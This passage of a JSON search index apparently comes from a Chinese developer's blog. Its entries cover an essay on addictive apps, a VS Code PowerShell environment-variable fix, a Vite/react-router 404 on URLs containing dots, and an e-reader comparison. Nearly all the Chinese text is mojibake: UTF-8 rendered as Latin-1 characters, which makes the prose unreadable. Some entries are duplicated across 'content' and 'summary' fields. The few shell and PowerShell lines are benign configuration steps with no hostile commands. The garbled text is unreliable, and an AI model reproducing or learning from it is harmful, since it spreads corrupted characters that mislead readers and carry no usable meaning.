ä¸€å¥å…³å¿ƒã€‚\næˆ‘çˆ¸ç”Ÿäº70å¹´ä»£ï¼Œæ²¡æ€ä¹ˆè¯»è¿‡ä¹¦ï¼Œå°å­¦æ–‡å‡­ã€‚ç°åœ¨å¹´è¿‘äº”åï¼Œç»å¸¸å¸¦ç€é¸­èˆŒå¸½ï¼Œä¾ç„¶é®ä¸ä½åè„‘å‹ºæ–‘ç™½çš„å¤´å‘ã€‚è™½ç„¶ä»–ç»å¸¸ç”¨æ‰‹æœºï¼Œä½†æ˜¯å¾ˆå¤šä¸œè¥¿ä¾ç„¶æä¸æ˜ç™½ï¼Œéœ€è¦æ‰¾èº«è¾¹çš„å¹´è½»äººæ¥å¸®å¿™è®¾ç½®æ‰‹æœºã€‚\nä¸€ä¸ª50å¤šå²çš„äººï¼Œäººç”Ÿè¿‡äº†å¤§åŠã€‚é¢å¯¹ç°åœ¨é£é€Ÿå‘å±•çš„ç¤¾ä¼šï¼Œå¾ˆå¤šä¸œè¥¿éƒ½å·²ç»æ— æ³•é€‚åº”ã€‚å¯¹äºä»–è‡ªå·±æ¥è¯´ï¼Œä¹ŸåŸºæœ¬ä¸Šæ— æ³•æ”¹å˜è‡ªå·±ã€‚ä»ç¬¬ä¸ƒæ¬¡äººå£æ™®æŸ¥çš„æ•°æ®ä¸­å¯ä»¥çœ‹å‡ºï¼Œåœ¨2020å¹´60+çš„äººå£å·²ç»å æ¯”æ¥è¿‘14äº¿äººå£çš„20%äº†ï¼Œéšç€æ—¶é—´çš„æ¨ç§»ï¼Œè¿™ä¸ªå æ¯”åªä¼šå¢å¤§ã€‚\nå¯¹äºæˆ‘çˆ¸è¿™ç±»çš„äººï¼Œå³ä½¿åˆ·çš„çœ¼ç›ç–¼ï¼Œä¹Ÿæ— æ³•æ§åˆ¶è‡ªå·±ï¼Œè¿˜æ˜¯ä¸€ç›´ä¸åœçš„åˆ·ã€‚\nç”±æ­¤å¯è§ï¼Œåƒè¿™ç§å¤§å…¬å¸ï¼Œåˆ¶ä½œçš„è¶…çº§Appæœ‰å¤šå¯æ€•ã€‚èƒ½å¤Ÿä¸€ç›´æŒç»­çš„è®©å¤§è„‘ä¿æŒçŸ­æœŸå…´å¥‹ã€‚è¿™ç§è¶…çº§Appï¼ŒèƒŒåéƒ½æ˜¯å¿ƒç†å­¦å®¶ã€è®¡ç®—æœºå­¦å®¶ã€æ•°æ®ç§‘å­¦å®¶ç­‰ã€‚ è¿™äº›ä¸“å®¶å¯¹å¾…æ™®é€šå¤§ä¼—ï¼Œå°±åƒå“¥ä¼¦å¸ƒå¯¹å¾…å°ç¬¬å®‰äººã€‚\nå› ä¸ºæˆ‘å‘ç°ä»–ä»¬æ²¡æœ‰ä»€ä¹ˆä¿¡ä»°ï¼Œä¹Ÿæ²¡æœ‰ä»»ä½•å´‡æ‹œçš„å½¢è±¡ï¼Œäººä»¬åˆéƒ½å¾ˆæ¸©å’Œï¼Œä»–ä»¬æ— é‚ªå¾—ä¸çŸ¥é“ä»€ä¹ˆæ˜¯é‚ªæ¶ï¼Œä»ä¸ä¾µå®³åˆ«äººï¼Œä¹Ÿä¸æ‡‚å¾—å·çªƒï¼Œæ²¡æœ‰æ‰“æ–—ï¼Œç‰¹åˆ«çš„æ¸©é¡º ã€Šå“¥ä¼¦å¸ƒæ—¥è®°ã€‹\næˆ–è®¸å‡ åå¹´ä»¥åï¼Œå¤§éƒ¨åˆ†äººçš„å¤§è„‘å·²ç»é€€åŒ–ï¼Œä¹Ÿä¸éœ€è¦æœ‰æ€è€ƒèƒ½é‡Œã€‚åªéœ€è¦æœºæ¢°çš„æŒ‰ç…§åˆºæ¿€-\u0026gt;ååº”å»è¡ŒåŠ¨ã€‚\nè¿™ç§è¿›åŒ–æ˜¯ä¸€ç§æ½®æµï¼Œç»å¤§å¤šæ•°äººéƒ½éš¾ä»¥å¹¸å…ã€‚ä½œä¸ºä¸€ä¸ªç‹¬ç«‹æ€è€ƒçš„äººï¼Œæˆ‘åªèƒ½å°½é‡é¿å…è¢«å½±å“ï¼Œè¿œç¦»ç¤¾äº¤ç½‘ç»œã€‚","title":"ç®—æ³• - å…¥ä¾µè„‘ç»†èƒ"},{"content":"æˆ‘åœ¨ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡è®¾ç½®é‡Œï¼Œç”¨æˆ·å’Œç³»ç»Ÿä¸­ï¼Œéƒ½åŠ å…¥äº†ELECTRON_MIRROR=https://npmmirror.com/mirrors/electron/è¿™ä¸ªç¯å¢ƒå˜é‡ã€‚\nå•ç‹¬æ‰“å¼€windows Terminalåº”ç”¨ï¼Œä½¿ç”¨ env | grep ELE æ˜¯èƒ½æœåˆ°æˆ‘è®¾ç½®çš„ç¯å¢ƒå˜é‡çš„ã€‚ä½†æ˜¯åœ¨vscodeä¸­ï¼Œè¿™ä¸ªç¯å¢ƒå˜é‡ä¸å­˜åœ¨ã€‚\næˆ‘å°è¯•äº†ä»¥ä¸‹å‡ ä¸ªæ–¹æ³•\né‡å¯ç”µè„‘ï¼Œæ— æ•ˆ é…ç½®\u0026quot;terminal.integrated.persistentSessionReviveProcess\u0026quot;: \u0026quot;never\u0026quot;, ç„¶åé‡å¯ç”µè„‘ï¼Œæ— æ•ˆ åœ¨ç»ˆç«¯ç›´æ¥æ‰§è¡Œcode ., åœ¨ç»ˆç«¯æ‰“å¼€vscode, ä¾ç„¶æ— æ•ˆ å› æ­¤ï¼Œæˆ‘æƒ³èµ·äº†ä¹‹å‰é…ç½®çš„pwshçš„é…ç½®æ–‡ä»¶ã€‚ å¯ä»¥ä½¿ç”¨code $PROFILE, æ‰“å¼€pwshçš„é…ç½®æ–‡ä»¶ã€‚\nç„¶åå†é…ç½®æ–‡ä»¶ä¸­è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œ ä¹‹åé‡å¯vscode, ç¯å¢ƒå˜é‡å°±æ­£å¸¸èƒ½è¯»å–åˆ°äº†ã€‚\n# æ–‡ä»¶å Microsoft.PowerShell_profile.ps1 $env:ELECTRON_MIRROR=\u0026#34;https://npmmirror.com/mirrors/electron/\u0026#34; å‚è€ƒ https://www.zhihu.com/question/266858097 ","permalink":"https://wdd.js.org/posts/2023/vscode-pwsh-env-not-work/","summary":"æˆ‘åœ¨ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡è®¾ç½®é‡Œï¼Œç”¨æˆ·å’Œç³»ç»Ÿä¸­ï¼Œéƒ½åŠ å…¥äº†ELECTRON_MIRROR=https://npmmirror.com/mirrors/electron/è¿™ä¸ªç¯å¢ƒå˜é‡ã€‚\nå•ç‹¬æ‰“å¼€windows Terminalåº”ç”¨ï¼Œä½¿ç”¨ env | grep ELE æ˜¯èƒ½æœåˆ°æˆ‘è®¾ç½®çš„ç¯å¢ƒå˜é‡çš„ã€‚ä½†æ˜¯åœ¨vscodeä¸­ï¼Œè¿™ä¸ªç¯å¢ƒå˜é‡ä¸å­˜åœ¨ã€‚\næˆ‘å°è¯•äº†ä»¥ä¸‹å‡ ä¸ªæ–¹æ³•\né‡å¯ç”µè„‘ï¼Œæ— æ•ˆ é…ç½®\u0026quot;terminal.integrated.persistentSessionReviveProcess\u0026quot;: \u0026quot;never\u0026quot;, ç„¶åé‡å¯ç”µè„‘ï¼Œæ— æ•ˆ åœ¨ç»ˆç«¯ç›´æ¥æ‰§è¡Œcode ., åœ¨ç»ˆç«¯æ‰“å¼€vscode, ä¾ç„¶æ— æ•ˆ å› æ­¤ï¼Œæˆ‘æƒ³èµ·äº†ä¹‹å‰é…ç½®çš„pwshçš„é…ç½®æ–‡ä»¶ã€‚ å¯ä»¥ä½¿ç”¨code $PROFILE, æ‰“å¼€pwshçš„é…ç½®æ–‡ä»¶ã€‚\nç„¶åå†é…ç½®æ–‡ä»¶ä¸­è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œ ä¹‹åé‡å¯vscode, ç¯å¢ƒå˜é‡å°±æ­£å¸¸èƒ½è¯»å–åˆ°äº†ã€‚\n# æ–‡ä»¶å Microsoft.PowerShell_profile.ps1 $env:ELECTRON_MIRROR=\u0026#34;https://npmmirror.com/mirrors/electron/\u0026#34; å‚è€ƒ https://www.zhihu.com/question/266858097 ","title":"è§£å†³ VsCode pwshç»ˆç«¯ç¯å¢ƒå˜é‡ä¸ç”Ÿæ•ˆé—®é¢˜"},{"content":"ä»Šå¤©é‡åˆ°ä¸€ä¸ªå¥‡æ€ªçš„é—®é¢˜ï¼Œreact-routerçš„è·¯å¾„åŒ¹é…æ— æ³•æ­£å¸¸å·¥ä½œï¼Œåè€Œå‘viteçš„dev serverå‘é€äº†GETè¯·æ±‚ï¼Œè¿™ä¸ªè¯·æ±‚æŠ¥é”™404ã€‚é¡µé¢ç›´æ¥æ— æ³•è®¿é—®ã€‚\næŒ‰ç†è¯´è¿™ç§å‰ç«¯è·¯ç”±çš„æ¡†æ¶åº”è¯¥ä¸éœ€è¦å‘åæ®µå‘é€è¯·æ±‚çš„ã€‚\nåæ¥æˆ‘æ€€ç–‘æ˜¯ä¸æ˜¯ä»£ç†çš„é—®é¢˜ï¼Œä½†æ˜¯åªæ˜¯éƒ¨åˆ†é¡µé¢æ— æ³•è®¿é—®ï¼Œæ‰€ä»¥æ’å‡ºè¿™ä¸ªé€‰é¡¹ã€‚\néšåæˆ‘çš„ç³»ç»Ÿåˆæ”¶åˆ°ä¸€æ¡æµ‹è¯•æ•°æ®ï¼Œè¿™æ¡æµ‹è¯•æ•°æ®å´èƒ½å¤Ÿæ­£å¸¸è·³è½¬ã€‚\næˆ‘ä»”ç»†çš„å¯¹åˆ«äº†ä¸¤ä¸ªä¸åŒçš„urlï¼Œå‘ç°æœ‰é—®é¢˜çš„é‚£ä¸ªurlåŒ…å«äº†ä¸€ä¸ªè‹±æ–‡å­—ç¬¦., æ‰€ä»¥æˆ‘æ€€ç–‘æ˜¯react-routerçš„è·¯å¾„åŒ¹é…æœ‰é—®é¢˜ã€‚\n/call/2023-11-09/nlLBs32pp.2oXhnY6xzmYBCnjhYUkc7Z /call/2023-11-09/fYqZKTGHBFVCz4iC5irulFc83giH9bsa\tæˆ‘çš„ç¬¬ä¸€ååº”æ˜¯react-routerå¯¹äºåŠ¨æ€çš„è·¯å¾„ï¼Œæ˜¯æœ‰å­—ç¬¦è¦æ±‚çš„ã€‚ç¿»é˜…å®˜æ–¹æ–‡æ¡£åï¼Œæ²¡æœ‰å‘ç°ç±»ä¼¼çš„æè¿°ã€‚\nç„¶åæˆ‘åœ¨react-routerçš„issueåˆ—è¡¨ä¸ŠæŸ¥æ‰¾æœ‰æ²¡æœ‰äººæå‡ºç±»ä¼¼çš„é—®é¢˜ï¼Œå‘ç°äº† [Bug]: paths with dynamic parameters do not work correctly when there is a dot in the url,\nç´§æ¥ç€æœ‰äººåˆ†æï¼Œè¯´è¿™ä¸ªé—®é¢˜å¹¶ä¸æ˜¯react-routerä¸Šçš„ï¼Œè€Œæ˜¯å‡ºåœ¨viteä¸Šã€‚ viteçš„é¡¹ç›®ä¸Šä¹Ÿæœ‰å¯¹åº”çš„issueååº”è¿™ä¸ªé—®é¢˜ã€‚\nè§£å†³æ–¹æ¡ˆ æ–¹æ¡ˆ1: å‡çº§vite åˆ°5.xï¼Œ ç”±äºå½“å‰ç¨³å®šçš„è¿˜æ˜¯4.xçš„vite, æ‰€ä»¥è¿™ä¸ªæ–¹æ¡ˆæ”¹åŠ¨å¤ªå¤§ï¼Œæ”¾å¼ƒ æ–¹æ¡ˆ2: åœ¨åŒ¹é…è·¯å¾„æœ€ååŠ ä¸Š/, ä¹Ÿå°±æ˜¯åŸæœ¬çš„/a.bè¦æ”¹æˆ/a.b/, æˆ‘è¯•äº†è¿™ä¸ªæ–¹æ¡ˆï¼Œæ˜¯æœ‰æ•ˆçš„ã€‚ æ–¹æ¡ˆ3: ä½¿ç”¨è¿™ä¸ªä¸“é—¨ç”¨æ¥è§£å†³è¿™ä¸ªé—®é¢˜çš„æ’ä»¶ï¼Œ https://github.com/ivesia/vite-plugin-rewrite-all æ·±å…¥åˆ†æ è·¯å¾„å¸¦æœ‰ç‚¹ï¼Œä¸€èˆ¬å¯èƒ½è®¤ä¸ºæ˜¯ä¸€ä¸ªé™æ€èµ„æºï¼Œä¾‹å¦‚a.js, b.cssä¹‹ç±»çš„ï¼Œæ‰€ä»¥viteä¼šæŠŠç¬¦åˆè¿™ä¸ªæ¨¡å¼çš„è·¯å¾„ç›´æ¥å‘åæ®µå‘é€è¯·æ±‚ï¼Œå»è·å–é™æ€èµ„æºï¼Œè€Œä¸æ˜¯å»åŒ¹é…ä¸€ä¸ªç»„ä»¶ã€‚\nå‚è€ƒ https://github.com/remix-run/react-router/issues/8389 https://github.com/vitejs/vite/issues/2415 https://github.com/vitejs/vite/issues/11282 https://github.com/vitejs/vite/issues/2628 https://github.com/vitejs/vite/pull/2191/files https://github.com/bripkens/connect-history-api-fallback ","permalink":"https://wdd.js.org/posts/2023/vite-react-route-url-dot-404/","summary":"ä»Šå¤©é‡åˆ°ä¸€ä¸ªå¥‡æ€ªçš„é—®é¢˜ï¼Œreact-routerçš„è·¯å¾„åŒ¹é…æ— æ³•æ­£å¸¸å·¥ä½œï¼Œåè€Œå‘viteçš„dev serverå‘é€äº†GETè¯·æ±‚ï¼Œè¿™ä¸ªè¯·æ±‚æŠ¥é”™404ã€‚é¡µé¢ç›´æ¥æ— æ³•è®¿é—®ã€‚\næŒ‰ç†è¯´è¿™ç§å‰ç«¯è·¯ç”±çš„æ¡†æ¶åº”è¯¥ä¸éœ€è¦å‘åæ®µå‘é€è¯·æ±‚çš„ã€‚\nåæ¥æˆ‘æ€€ç–‘æ˜¯ä¸æ˜¯ä»£ç†çš„é—®é¢˜ï¼Œä½†æ˜¯åªæ˜¯éƒ¨åˆ†é¡µé¢æ— æ³•è®¿é—®ï¼Œæ‰€ä»¥æ’å‡ºè¿™ä¸ªé€‰é¡¹ã€‚\néšåæˆ‘çš„ç³»ç»Ÿåˆæ”¶åˆ°ä¸€æ¡æµ‹è¯•æ•°æ®ï¼Œè¿™æ¡æµ‹è¯•æ•°æ®å´èƒ½å¤Ÿæ­£å¸¸è·³è½¬ã€‚\næˆ‘ä»”ç»†çš„å¯¹åˆ«äº†ä¸¤ä¸ªä¸åŒçš„urlï¼Œå‘ç°æœ‰é—®é¢˜çš„é‚£ä¸ªurlåŒ…å«äº†ä¸€ä¸ªè‹±æ–‡å­—ç¬¦., æ‰€ä»¥æˆ‘æ€€ç–‘æ˜¯react-routerçš„è·¯å¾„åŒ¹é…æœ‰é—®é¢˜ã€‚\n/call/2023-11-09/nlLBs32pp.2oXhnY6xzmYBCnjhYUkc7Z /call/2023-11-09/fYqZKTGHBFVCz4iC5irulFc83giH9bsa\tæˆ‘çš„ç¬¬ä¸€ååº”æ˜¯react-routerå¯¹äºåŠ¨æ€çš„è·¯å¾„ï¼Œæ˜¯æœ‰å­—ç¬¦è¦æ±‚çš„ã€‚ç¿»é˜…å®˜æ–¹æ–‡æ¡£åï¼Œæ²¡æœ‰å‘ç°ç±»ä¼¼çš„æè¿°ã€‚\nç„¶åæˆ‘åœ¨react-routerçš„issueåˆ—è¡¨ä¸ŠæŸ¥æ‰¾æœ‰æ²¡æœ‰äººæå‡ºç±»ä¼¼çš„é—®é¢˜ï¼Œå‘ç°äº† [Bug]: paths with dynamic parameters do not work correctly when there is a dot in the url,\nç´§æ¥ç€æœ‰äººåˆ†æï¼Œè¯´è¿™ä¸ªé—®é¢˜å¹¶ä¸æ˜¯react-routerä¸Šçš„ï¼Œè€Œæ˜¯å‡ºåœ¨viteä¸Šã€‚ viteçš„é¡¹ç›®ä¸Šä¹Ÿæœ‰å¯¹åº”çš„issueååº”è¿™ä¸ªé—®é¢˜ã€‚\nè§£å†³æ–¹æ¡ˆ æ–¹æ¡ˆ1: å‡çº§vite åˆ°5.xï¼Œ ç”±äºå½“å‰ç¨³å®šçš„è¿˜æ˜¯4.xçš„vite, æ‰€ä»¥è¿™ä¸ªæ–¹æ¡ˆæ”¹åŠ¨å¤ªå¤§ï¼Œæ”¾å¼ƒ æ–¹æ¡ˆ2: åœ¨åŒ¹é…è·¯å¾„æœ€ååŠ ä¸Š/, ä¹Ÿå°±æ˜¯åŸæœ¬çš„/a.bè¦æ”¹æˆ/a.b/, æˆ‘è¯•äº†è¿™ä¸ªæ–¹æ¡ˆï¼Œæ˜¯æœ‰æ•ˆçš„ã€‚ æ–¹æ¡ˆ3: ä½¿ç”¨è¿™ä¸ªä¸“é—¨ç”¨æ¥è§£å†³è¿™ä¸ªé—®é¢˜çš„æ’ä»¶ï¼Œ https://github.com/ivesia/vite-plugin-rewrite-all æ·±å…¥åˆ†æ è·¯å¾„å¸¦æœ‰ç‚¹ï¼Œä¸€èˆ¬å¯èƒ½è®¤ä¸ºæ˜¯ä¸€ä¸ªé™æ€èµ„æºï¼Œä¾‹å¦‚a.js, b.cssä¹‹ç±»çš„ï¼Œæ‰€ä»¥viteä¼šæŠŠç¬¦åˆè¿™ä¸ªæ¨¡å¼çš„è·¯å¾„ç›´æ¥å‘åæ®µå‘é€è¯·æ±‚ï¼Œå»è·å–é™æ€èµ„æºï¼Œè€Œä¸æ˜¯å»åŒ¹é…ä¸€ä¸ªç»„ä»¶ã€‚\nå‚è€ƒ https://github.com/remix-run/react-router/issues/8389 https://github.com/vitejs/vite/issues/2415 https://github.com/vitejs/vite/issues/11282 https://github.com/vitejs/vite/issues/2628 https://github.com/vitejs/vite/pull/2191/files https://github.com/bripkens/connect-history-api-fallback ","title":"Vite React Route URLå«æœ‰.æ—¶ï¼Œè·¯å¾„æ— æ³•æ­£å¸¸åŒ¹é…"},{"content":"è´­ä¹°é€‰æ‹© æˆ‘çš„kindle pw4å·²ç»ç”¨äº†å¿«ä¸‰å¹´äº†ï¼Œæœºå™¨æ€§èƒ½æœ‰äº›ä¸è¶³ï¼Œç”µæ± ä¹Ÿæœ‰äº›ä¸å¤Ÿç”¨äº†ã€‚æ­£é€¢åŒåä¸€ä¹‹é™…ï¼Œæˆ‘è§‰å¾—å¯ä»¥ä¹°ä¸€ä¸ªå¼€æ”¾ç³»ç»Ÿçš„ç”µçº¸ä¹¦æ¥ç”¨ç”¨ã€‚\nä¹°å¼€æ”¾ç³»ç»Ÿçš„å¦ä¸€ä¸ªåŸå› æ˜¯è‡ªä»äºšé©¬é€Šé€€å‡ºä¸­å›½åï¼Œæˆ‘ç”¨å¾®ä¿¡è¯»ä¹¦æ¯”è¾ƒå¤šï¼Œä¹Ÿä¹°äº†å¾®ä¿¡è¯»ä¹¦çš„ä¼šå‘˜ã€‚\nå¼€æ”¾ç³»ç»ŸåŸºæœ¬ä¸Šéƒ½æ˜¯åŸºäºå®‰å“ç³»ç»Ÿå®šåˆ¶çš„ï¼Œå¯ä»¥é€‰æ‹©çš„å‚å•†æ¯”è¾ƒå¤šã€‚\næœ€ç»ˆç­›é€‰ä¸‹æ¥ï¼Œæˆ‘é€‰æ‹©äº†æ±‰ç‹clear7å’Œæ–‡çŸ³leaf3ï¼Œ æˆ‘ä¸‹å•äº†ä¸¤ä¸ªï¼Œè§‰å¾—å…ˆä½“éªŒä¸€ä¸‹ï¼Œç„¶ååœ¨é€€ä¸€ä¸ªã€‚\nç„¶è€Œç”¨äº†ä¸åˆ°ä¸¤å¤©ä¹‹åï¼Œæˆ‘è¿˜æ˜¯å†³å®šæŠŠä¸¤ä¸ªæœºå™¨éƒ½ç»™é€€äº†ï¼Œç»§ç»­ç”¨æˆ‘çš„kindle pw4ã€‚\né€‰æ‹©å› ç´  å°±æˆ‘ä¸ªäººè€Œè¨€ï¼Œç”µå­ä¹¦æœ€ä¸ºé‡è¦çš„é€‰æ‹©å› ç´ æœ‰ä»¥ä¸‹ä¸‰ç‚¹ã€‚\næ˜¾ç¤ºæ•ˆæœ: è¯´å®åœ¨çš„ï¼Œç°åœ¨çš„ç”µå­ä¹¦åŸºæœ¬ä¸Šéƒ½æ˜¯carta1200ã€300ppiã€å†·æš–å…‰ã€‚åŸºæœ¬ä¸Šä»æ˜¾ç¤ºæ•ˆæœä¸Šæ¥è¯´ï¼Œå„å¤§å‚å®¶éƒ½æ˜¯åŠæ–¤å…«ä¸¤ã€‚å°±æˆ‘è‡ªå·±ä½“éªŒè€Œè¨€ï¼Œæˆ‘å¹¶æ²¡æœ‰å‘ç°æ±‰ç‹çš„æ˜¾ç¤ºæ•ˆæœå’Œæ–‡çŸ³leaf3æœ‰ä½•ä¸åŒã€‚ æ¡æŒæ‰‹æ„Ÿ: å¤–è§‚å½±å“æ¡æŒæ‰‹æ„Ÿï¼Œå¤–è§‚ä¸€èˆ¬åˆ†ä¸ºä¸¤ç±»ï¼Œä¸€ç±»æ˜¯å°±æ˜¯å¹³æ¿è®¾è®¡ï¼Œåƒkindle paperwhiteç³»åˆ—ã€‚å¦ä¸€ç±»å°±æ˜¯ä¹¦è„Šå¼è®¾è®¡ï¼Œæ¡æŒæ›´èˆ’é€‚ï¼Œåƒkindle os3, æ±‰ç‹clear7ä¹‹ç±»çš„ã€‚ ç®€æ´ç³»ç»Ÿ: ç”µå­ä¹¦å¹¶ä¸æ˜¯æ‰‹æœºï¼Œä¸éœ€è¦å¤ªå¤šçš„åŠŸèƒ½ï¼ŒåŠŸèƒ½å¤ªå¤šåè€Œæˆä¸ºç´¯èµ˜ ç¨³å®šæ€§: ç‚¹å­äº§å“éš¾å…è¢«æ‘”ã€æˆ–è€…æ·‹æ°´ï¼Œå¯¹äºè¿™äº›æ„å¤–æƒ…å†µï¼Œå¦‚æœäº§å“éå¸¸è„†å¼±ï¼Œé‚£ä¹ˆå¾ˆå¤§å¯èƒ½ä¼šæŸå¤±å¤§ç¬”çš„é‡‘é¢ã€‚ ç»­èˆª æ–‡çŸ³çš„ç¼ºç‚¹ æ–‡çŸ³å’Œæ±‰ç‹çš„ä¸¤æ¬¾äº§å“ï¼Œæ‹¿åˆ°æ‰‹å¼€æœºä¸åˆ°ä¸€å°æ—¶ï¼Œæˆ‘å°±å†³å®šå…ˆé€€äº†æ–‡çŸ³ã€‚\nåŸå› æœ‰ä»¥ä¸‹å‡ ç‚¹\næ˜¾ç¤ºæ•ˆæœæ–‡çŸ³å’Œæ±‰ç‹å·®ä¸å¤šï¼Œæ²¡å•¥çªå‡ºäº®ç‚¹ æ¡æŒæ‰‹æ„Ÿæ–‡çŸ³è‚¯å®šæ¯”ä¸è¿‡æ±‰ç‹çš„ä¹¦è„Šå¼è®¾è®¡, å¹¶ä¸”æ±‰ç‹æ›´è½» æ–‡çŸ³çš„ç³»ç»Ÿå¤ªå¤æ‚ï¼Œè®¾ç½®å¤ªå¤šï¼Œç”šè‡³è¿˜æœ‰ä¸ªiphoneç±»ä¼¼çš„å°ç™½ç‚¹è®¾è®¡ï¼Œå°ç™½ç‚¹ç‚¹å‡»ä¹‹åå±•å¼€å¾ˆå¤šå›¾æ ‡ï¼Œæ¯ä¸ªå›¾æ ‡æˆ‘éƒ½ä¸çŸ¥é“åšä»€ä¹ˆçš„ æ‰ç”µé€Ÿåº¦ï¼Œæ–‡çŸ³çš„ç”µé‡è‚‰çœ¼å¯è§çš„åœ¨ä¸æ–­å‡å°‘ æ±‰ç‹çš„ç¼ºç‚¹ å¾®ä¿¡è¯»ä¹¦åŠŸèƒ½é˜‰å‰², è¿™ä¸æ˜¯æ±‰ç‹çš„é—®é¢˜ï¼Œè€Œæ˜¯å¾®ä¿¡è¯»ä¹¦è‡ªèº«çš„é—®é¢˜ã€‚ä¾‹å¦‚ä¹¦æ¶é¡µé¢ï¼Œä¹¦ç±åªæœ‰ä¸€ä¸ªæ’åºçš„é¡ºåºï¼Œå°±æ˜¯æŒ‰ç…§æœ€è¿‘é˜…è¯»çš„æ’åºã€‚è€Œæ— æ³•åƒiosæˆ–è€…å®‰å“appä¸€æ ·èƒ½å¤ŸæŒ‰ç…§é˜…è¯»è¿›åº¦æ’åºï¼Œå¦å¤–ä¹Ÿæ²¡æœ‰é˜…è¯»æ—¶é•¿åˆ†æçš„åŠŸèƒ½ã€‚ å¦å¤–æˆ‘ä¹Ÿæ³¨æ„åˆ°ï¼Œå¾®ä¿¡è¯»ä¹¦ç”µçº¸ä¹¦ç‰ˆï¼Œæ‰«ç ç™»å½•çš„æœ‰æ•ˆæœŸæ˜¯24å°æ—¶ï¼Œæˆ‘ä¸çŸ¥é“è¿™æ˜¯ä¸æ˜¯æ„å‘³ç€24å°æ—¶ä¹‹åæˆ‘åˆè¦é‡æ–°æ‰«ç ã€‚\nè§¦æ„Ÿå…‰æ»‘ï¼Œæ±‰ç‹çš„èƒŒæ¿çš„è§¦æ„Ÿè®©äººæ„Ÿè§‰éå¸¸å…‰æ»‘ï¼Œæ„Ÿè§‰ç¨ä¸æ³¨æ„å°±ä¼šæ»‘ä¸‹å»çš„æ ·å­ã€‚å®Œå…¨æ²¡æœ‰kindle pw4é‚£ç§æ‹¿åœ¨æ‰‹æœºï¼Œå°±ç²˜åœ¨æ‰‹ä¸Šçš„æ„Ÿè§‰ã€‚æ‰€ä»¥æˆ‘è§‰å¾—ï¼Œä¹°æ±‰ç‹ï¼Œå°±å¿…é¡»è¦ä¹°ä¸€ä¸ªä¿æŠ¤å¥—ï¼Œä½†æ˜¯å®˜æ–¹å–çš„ä¿æŠ¤å¥—ä¹Ÿå¤ªè´µäº†å§ï¼Œå±…ç„¶è¦110å¤šå—ï¼Œè¿™ç‚¹æœ‰ç‚¹åƒå‰²éŸ­èœã€‚ä»€ä¹ˆä¿æŠ¤å¥—èƒ½å–é‚£ä¹ˆè´µï¼Œéƒ½å¿«èµ¶ä¸Šååˆ†ä¹‹ä¸€çš„ç”µçº¸ä¹¦çš„ä»·æ ¼äº†ã€‚\nè¯å…¸ç¼ºé™·ï¼Œæ±‰ç‹çš„è¯å…¸ä¹Ÿæ˜¯æˆ‘è¦åæ§½çš„åŠŸèƒ½ä¹‹ä¸€ï¼Œåªèƒ½æŠŠå•è¯çš„åŸå‹åŠ å…¥åˆ°å•è¯æœ¬ï¼Œå•è¯æ¥ä¸ªå¤æ•°æˆ–è€…è¿‡å»åˆ†è¯ï¼Œå°±ä¸èƒ½åŠ å…¥å•è¯æœ¬äº†ã€‚kindleçš„ç”Ÿè¯æœ¬ï¼Œæ‰€æœ‰å•è¯ï¼Œæ— è®ºä»€ä¹ˆå½¢å¼éƒ½èƒ½åŠ å…¥å•è¯æœ¬ã€‚\næ‰ç”µé€Ÿåº¦, ä»æ˜¨æ™šäº”ç‚¹å¤šå¼€æœºï¼Œåˆ°ä»Šå¤©æ—©ä¸Šï¼ŒåŸºæœ¬ä¸Šæ²¡åˆ°ä¸€å¤©ï¼Œç”µæ± å·²ç»æ‰ç”µæ¥è¿‘40%äº†\nè‡ªåŠ¨å…³æœº, ä¸ºäº†çœç”µï¼Œæ±‰ç‹åœ¨2å°æ—¶ä¸ä½¿ç”¨åï¼Œä¼šè‡ªåŠ¨å…³æœºã€‚ç„¶è€Œè¿™ä¸ªå¼€æœºæ—¶é—´å°±æœ‰ç‚¹ä¹…ï¼Œä½ å¯è®¾æƒ³ä¸€ä¸‹ï¼Œæ¯å¤©æ—©ä¸Šï¼Œä½ æƒ³çœ‹ä¹¦çš„æ—¶å€™ï¼Œä½ éƒ½è¦ç­‰å‡ åç§’çš„å¼€æœºæ—¶é—´ï¼Œé‚£ä½ èƒ½å—å¾—äº†å—ï¼Ÿ\næŒ‰é’®åé¦ˆï¼Œæ¾æ¾å®å®, è§¦æ„Ÿæ²¡æœ‰ä¸€è‡´æ€§ä½“éªŒ\nç»“è®º ç›®å‰è€Œè¨€ï¼Œå›½äº§çš„ç”µçº¸ä¹¦ç³»ç»Ÿï¼Œé™¤äº†å¼€æ”¾çš„ç³»ç»Ÿä¹‹å¤–ï¼Œå…¶ä»–å„ä¸ªæ–¹é¢è¿˜æ˜¯å­˜åœ¨ä¸kindleæœ‰è¾ƒå¤§çš„å·®è·ã€‚\nå½“ç„¶ï¼Œå¦‚æœä½ ä»æœªä½¿ç”¨è¿‡kindleç³»åˆ—çš„äº§å“ï¼Œå›½äº§çš„ç”µçº¸ä¹¦è¿˜æ˜¯å€¼å¾—ä¹°çš„ã€‚\n","permalink":"https://wdd.js.org/posts/2023/hanvon-clear7-vs-book-leaf3/","summary":"è´­ä¹°é€‰æ‹© æˆ‘çš„kindle pw4å·²ç»ç”¨äº†å¿«ä¸‰å¹´äº†ï¼Œæœºå™¨æ€§èƒ½æœ‰äº›ä¸è¶³ï¼Œç”µæ± ä¹Ÿæœ‰äº›ä¸å¤Ÿç”¨äº†ã€‚æ­£é€¢åŒåä¸€ä¹‹é™…ï¼Œæˆ‘è§‰å¾—å¯ä»¥ä¹°ä¸€ä¸ªå¼€æ”¾ç³»ç»Ÿçš„ç”µçº¸ä¹¦æ¥ç”¨ç”¨ã€‚\nä¹°å¼€æ”¾ç³»ç»Ÿçš„å¦ä¸€ä¸ªåŸå› æ˜¯è‡ªä»äºšé©¬é€Šé€€å‡ºä¸­å›½åï¼Œæˆ‘ç”¨å¾®ä¿¡è¯»ä¹¦æ¯”è¾ƒå¤šï¼Œä¹Ÿä¹°äº†å¾®ä¿¡è¯»ä¹¦çš„ä¼šå‘˜ã€‚\nå¼€æ”¾ç³»ç»ŸåŸºæœ¬ä¸Šéƒ½æ˜¯åŸºäºå®‰å“ç³»ç»Ÿå®šåˆ¶çš„ï¼Œå¯ä»¥é€‰æ‹©çš„å‚å•†æ¯”è¾ƒå¤šã€‚\næœ€ç»ˆç­›é€‰ä¸‹æ¥ï¼Œæˆ‘é€‰æ‹©äº†æ±‰ç‹clear7å’Œæ–‡çŸ³leaf3ï¼Œ 